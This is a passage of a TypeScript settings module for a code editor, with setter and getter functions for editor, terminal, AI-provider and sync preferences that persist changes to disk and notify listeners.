  if (key === 'filesTrimTrailingWhitespace') { _settings_filesTrimTrailingWhitespace = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorInsertFinalNewline') { _settings_editorInsertFinalNewline = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorTrimFinalNewlines') { _settings_editorTrimFinalNewlines = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorFormatNormalizeIndent') { _settings_editorFormatNormalizeIndent = val === '1' ? 1 : 0; return 1; }
  if (key === 'aiInlineCompletionEnabled') { _settings_aiInlineCompletionEnabled = val === '1' ? 1 : 0; return 1; }
  if (key === 'aiInlineCompletionDelay') { const n = parseInt(val); if (n >= 0) { _settings_aiInlineCompletionDelay = n; return 1; } return 0; }
  if (key === 'searchUseIgnoreFiles') { _settings_searchUseIgnoreFiles = val === '1' ? 1 : 0; return 1; }
  if (key === 'searchFollowSymlinks') { _settings_searchFollowSymlinks = val === '1' ? 1 : 0; return 1; }
  if (key === 'terminalFontSize') { const n = parseInt(val); if (n > 0) { _settings_terminalFontSize = n; return 1; } return 0; }
  if (key === 'terminalCursorStyle') { _settings_terminalCursorStyle = val; return 1; }
  if (key === 'terminalShell') { _settings_terminalShell = val; return 1; }
  if (key === 'terminalRows') { const n = parseInt(val); if (n >= 4 && n <= 200) { _settings_terminalRows = n; return 1; } return 0; }
  if (key === 'terminalCols') { const n = parseInt(val); if (n >= 40 && n <= 500) { _settings_terminalCols = n; return 1; } return 0; }
  return 0;
}

export function isWorkspaceOverlayActive(): number {
  return _workspaceOverlayActive;
}

export function getWorkspaceOverlayRoot(): string {
  return _workspaceOverlayRoot;
}

/** Update a string setting. */
export function setStringSetting(key: string, value: string): void {
  if (key === 'sidebarLocation') _settings_sidebarLocation = value;
  if (key === 'activityBarLocation') _settings_activityBarLocation = value;
  if (key === 'colorTheme') _settings_colorTheme = value;
  if (key === 'editorFontFamily') _settings_editorFontFamily = value;
  if (key === 'editorLineNumbers') _settings_editorLineNumbers = value;
  if (key === 'aiProvider') _settings_aiProvider = value;
  if (key === 'aiModel') _settings_aiModel = value;
  if (key === 'editorWordWrap') _settings_editorWordWrap = value;
  if (key === 'editorCursorStyle') _settings_editorCursorStyle = value;
  if (key === 'filesAutoSave') _settings_filesAutoSave = value;
  if (key === 'terminalCursorStyle') _settings_terminalCursorStyle = value;
  if (key === 'lastOpenFolder') _settings_lastOpenFolder = value;
  if (key === 'aiApiKey') _settings_aiApiKey = value;
  if (key === 'aiKeyAnthropic') _settings_aiKeyAnthropic = value;
  if (key === 'aiKeyOpenai') _settings_aiKeyOpenai = value;
  if (key === 'aiKeyGoogle') _settings_aiKeyGoogle = value;
  if (key === 'aiKeyDeepseek') _settings_aiKeyDeepseek = value;
  if (key === 'aiKeyXai') _settings_aiKeyXai = value;
  if (key === 'aiOllamaUrl') _settings_aiOllamaUrl = value;
  if (key === 'aiOllamaModel') _settings_aiOllamaModel = value;
  if (key === 'aiCustomUrl') _settings_aiCustomUrl = value;
  if (key === 'aiCustomKey') _settings_aiCustomKey = value;
  if (key === 'aiCustomModel') _settings_aiCustomModel = value;
  if (key === 'syncRelayUrl') _settings_syncRelayUrl = value;
  if (key === 'syncAuthUrl') _settings_syncAuthUrl = value;
  if (key === 'syncDeviceToken') _settings_syncDeviceToken = value;
  if (key === 'lastOpenTabs') _settings_lastOpenTabs = value;
  if (key === 'lastPinnedTabs') _settings_lastPinnedTabs = value;
  persistToDisk();
  notifyListeners();
}

/** Check if first-run setup is complete. */
export function isSetupComplete(): number {
  return _settings_setupComplete;
}

/** Get the last opened folder path. */
export function getLastOpenFolder(): string {
  return _settings_lastOpenFolder;
}

/** Get the pipe-separated list of last open tab paths. */
export function getLastOpenTabs(): string {
  return _settings_lastOpenTabs;
}

/** SHIP-V1-GAPS.md #26: pin mask matching the order of `lastOpenTabs`. */
export function getLastPinnedTabs(): string {
  return _settings_lastPinnedTabs;
}

/** Get the index of the last active tab. */
export function getLastActiveTab(): number {
  return _settings_lastActiveTab;
}

/** Update a number setting. */
export function setNumberSetting(key: string, value: number): void {
  if (key === 'activePanelIndex') _settings_activePanelIndex = value;
  if (key === 'editorFontSize') _settings_editorFontSize = value;
  if (key === 'editorTabSize') _settings_editorTabSize = value;
  if (key === 'filesAutoSaveDelay') _settings_filesAutoSaveDelay = value;
  if (key === 'terminalFontSize') _settings_terminalFontSize = value;
  if (key === 'aiInlineCompletionDelay') _settings_aiInlineCompletionDelay = value;
  if (key === 'lastActiveTab') _settings_lastActiveTab = value;
  if (key === 'lastActiveCursorLine') _settings_lastActiveCursorLine = value;
  if (key === 'lastActiveCursorCol') _settings_lastActiveCursorCol = value;
  if (key === 'lastActiveScrollTop') _settings_lastActiveScrollTop = value;
  if (key === 'sidebarWidth') { if (value >= 120 && value <= 800) _settings_sidebarWidth = value; }
  persistToDisk();
  notifyListeners();
}

/** Update a boolean setting (stored as 0/1). */
export function setBoolSetting(key: string, value: number): void {
  if (key === 'statusBarVisible') _settings_statusBarVisible = value;
  if (key === 'sidebarVisible') _settings_sidebarVisible = value;
  if (key === 'terminalVisible') _settings_terminalVisible = value;
  if (key === 'aiInlineCompletionEnabled') _settings_aiInlineCompletionEnabled = value;
  if (key === 'editorInsertSpaces') _settings_editorInsertSpaces = value;
  if (key === 'editorMinimapEnabled') _settings_editorMinimapEnabled = value;
  if (key === 'editorFormatOnSave') _settings_editorFormatOnSave = value;
  if (key === 'filesTrimTrailingWhitespace') _settings_filesTrimTrailingWhitespace = value;
  if (key === 'editorInsertFinalNewline') _settings_editorInsertFinalNewline = value;
  if (key === 'editorTrimFinalNewlines') _settings_editorTrimFinalNewlines = value;
  if (key === 'editorFormatNormalizeIndent') _settings_editorFormatNormalizeIndent = value;
  if (key === 'searchUseIgnoreFiles') _settings_searchUseIgnoreFiles = value;
  if (key === 'searchFollowSymlinks') _settings_searchFollowSymlinks = value;
  if (key === 'explorerShowHiddenFiles') _settings_explorerShowHiddenFiles = value;
  if (key === 'explorerRespectGitignore') _settings_explorerRespectGitignore = value;
  if (key === 'extensionsEnabledMask') { if (value >= 0 && value <= 2047) _settings_extensionsEnabledMask = value; }
  if (key === 'syncEnabled') _settings_syncEnabled = value;
  if (key === 'telemetryEnabled') _settings_telemetryEnabled = value;
  if (key === 'setupComplete') _settings_setupComplete = value;
  persistToDisk();
  notifyListeners();
}

/** Compatibility: update settings via patch object. Only uses explicitly known keys. */
export function updateSettings(patch: Partial<WorkbenchSettings>): void {
  // Use Object.keys to only iterate properties actually present in the patch
  const keys = Object.keys(patch);
  if (keys.length < 1) return;
  for (let i = 0; i < keys.length; i++) {
    const k = keys[i];
    if (k === 'sidebarLocation') _settings_sidebarLocation = (patch as any).sidebarLocation;
    if (k === 'activityBarLocation') _settings_activityBarLocation = (patch as any).activityBarLocation;
    if (k === 'statusBarVisible') _settings_statusBarVisible = (patch as any).statusBarVisible ? 1 : 0;
    if (k === 'sidebarVisible') _settings_sidebarVisible = (patch as any).sidebarVisible ? 1 : 0;
    if (k === 'activePanelIndex') _settings_activePanelIndex = (patch as any).activePanelIndex;
    if (k === 'terminalVisible') _settings_terminalVisible = (patch as any).terminalVisible ? 1 : 0;
    if (k === 'colorTheme') _settings_colorTheme = (patch as any).colorTheme;
    if (k === 'editorFontSize') _settings_editorFontSize = (patch as any).editorFontSize;
    if (k === 'editorFontFamily') _settings_editorFontFamily = (patch as any).editorFontFamily;
    if (k === 'editorTabSize') _settings_editorTabSize = (patch as any).editorTabSize;
    if (k === 'editorLineNumbers') _settings_editorLineNumbers = (patch as any).editorLineNumbers;
    if (k === 'aiProvider') _settings_aiProvider = (patch as any).aiProvider;
    if (k === 'aiModel') _settings_aiModel = (patch as any).aiModel;
    if (k === 'aiInlineCompletionEnabled') _settings_aiInlineCompletionEnabled = (patch as any).aiInlineCompletionEnabled ? 1 : 0;
    if (k === 'editorInsertSpaces') _settings_editorInsertSpaces = (patch as any).editorInsertSpaces ? 1 : 0;
    if (k === 'editorWordWrap') _settings_editorWordWrap = (patch as any).editorWordWrap;
    if (k === 'editorMinimapEnabled') _settings_editorMinimapEnabled = (patch as any).editorMinimapEnabled ? 1 : 0;
    if (k === 'editorFormatOnSave') _settings_editorFormatOnSave = (patch as any).editorFormatOnSave ? 1 : 0;
    if (k === 'editorCursorStyle') _settings_editorCursorStyle = (patch as any).editorCursorStyle;
    if (k === 'filesAutoSave') _settings_filesAutoSave = (patch as any).filesAutoSave;
    if (k === 'filesAutoSaveDelay') _settings_filesAutoSaveDelay = (patch as any).filesAutoSaveDelay;
    if (k === 'filesTrimTrailingWhitespace') _settings_filesTrimTrailingWhitespace = (patch as any).filesTrimTrailingWhitespace ? 1 : 0;
    if (k === 'editorInsertFinalNewline') _settings_editorInsertFinalNewline = (patch as any).editorInsertFinalNewline ? 1 : 0;
    if (k === 'editorTrimFinalNewlines') _settings_editorTrimFinalNewlines = (patch as any).editorTrimFinalNewlines ? 1 : 0;
    if (k === 'editorFormatNormalizeIndent') _settings_editorFormatNormalizeIndent = (patch as any).editorFormatNormalizeIndent ? 1 : 0;
    if (k === 'terminalFontSize') _settings_terminalFontSize = (patch as any).terminalFontSize;
    if (k === 'terminalCursorStyle') _settings_terminalCursorStyle = (patch as any).terminalCursorStyle;
    if (k === 'aiInlineCompletionDelay') _settings_aiInlineCompletionDelay = (patch as any).aiInlineCompletionDelay;
    if (k === 'searchUseIgnoreFiles') _settings_searchUseIgnoreFiles = (patch as any).searchUseIgnoreFiles ? 1 : 0;
    if (k === 'searchFollowSymlinks') _settings_searchFollowSymlinks = (patch as any).searchFollowSymlinks ? 1 : 0;
    if (k === 'lastOpenFolder') _settings_lastOpenFolder = (patch as any).lastOpenFolder;
    if (k === 'aiApiKey') _settings_aiApiKey = (patch as any).aiApiKey;
    if (k === 'aiKeyAnthropic') _settings_aiKeyAnthropic = (patch as any).aiKeyAnthropic;
    if (k === 'aiKeyOpenai') _settings_aiKeyOpenai = (patch as any).aiKeyOpenai;
    if (k === 'aiKeyGoogle') _settings_aiKeyGoogle = (patch as any).aiKeyGoogle;
    if (k === 'aiKeyDeepseek') _settings_aiKeyDeepseek = (patch as any).aiKeyDeepseek;
    if (k === 'aiKeyXai') _settings_aiKeyXai = (patch as any).aiKeyXai;
    if (k === 'aiOllamaUrl') _settings_aiOllamaUrl = (patch as any).aiOllamaUrl;
    if (k === 'aiOllamaModel') _settings_aiOllamaModel = (patch as any).aiOllamaModel;
    if (k === 'aiCustomUrl') _settings_aiCustomUrl = (patch as any).aiCustomUrl;
    if (k === 'aiCustomKey') _settings_aiCustomKey = (patch as any).aiCustomKey;
    if (k === 'aiCustomModel') _settings_aiCustomModel = (patch as any).aiCustomModel;
    if (k === 'syncEnabled') _settings_syncEnabled = (patch as any).syncEnabled ? 1 : 0;
    if (k === 'syncRelayUrl') _settings_syncRelayUrl = (patch as any).syncRelayUrl;
    if (k === 'syncAuthUrl') _settings_syncAuthUrl = (patch as any).syncAuthUrl;
    if (k === 'syncDeviceToken') _settings_syncDeviceToken = (patch as any).syncDeviceToken;
    if (k === 'telemetryEnabled') _settings_telemetryEnabled = (patch as any).telemetryEnabled ? 1 : 0;
    if (k === 'setupComplete') _settings_setupComplete = (patch as any).setupComplete ? 1 : 0;
    if (k === 'lastOpenTabs') _settings_lastOpenTabs = (patch as any).lastOpenTabs;
    if (k === 'lastActiveTab') _settings_lastActiveTab = (patch as any).lastActiveTab;
  }
  persistToDisk();
  notifyListeners();
}

function notifyListeners(): void {
  _settingsVersion = _settingsVersion + 1;
  const snap = buildSnapshot();
  for (let i = 0; i < _listeners.length; i++) {
    _listeners[i](snap);
  }
}

/** Get the settings change version counter (increments on every change). */
export function getSettingsVersion(): number {
  return _settingsVersion;
}

/** Register a callback for settings changes. */
export function onSettingsChange(listener: SettingsChangeListener): void {
  _listeners.push(listener);
}

/** Toggle sidebar location between 'left' and 'right'. */
export function toggleSidebarLocation(): void {
  if (_settings_sidebarLocation.charCodeAt(0) === 108) { // 'l'
    setStringSetting('sidebarLocation', 'right');
  } else {
    setStringSetting('sidebarLocation', 'left');
  }
}

// Auto-load settings from disk on module init
initSettings();
